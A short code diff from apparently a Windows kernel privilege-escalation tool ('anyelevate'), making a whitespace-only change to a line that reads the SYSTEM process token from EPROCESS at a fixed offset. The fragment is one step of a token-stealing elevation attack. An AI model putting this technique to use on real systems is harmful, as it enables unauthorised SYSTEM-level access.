@@ -89,7 +89,7 @@ namespace anyelevate
 		//
 		kernel::memcpy( 
 			&system_process_token, 
-			( void* )(( uint64_t )system_process + RVA_PEPROCESS_TOKEN ), 
+			( void* )( ( uint64_t )system_process + RVA_PEPROCESS_TOKEN ), 
 			sizeof( EX_FAST_REF ) );
 
 		printf( " ---> Token.Object : %p\n", system_process_token.Object );
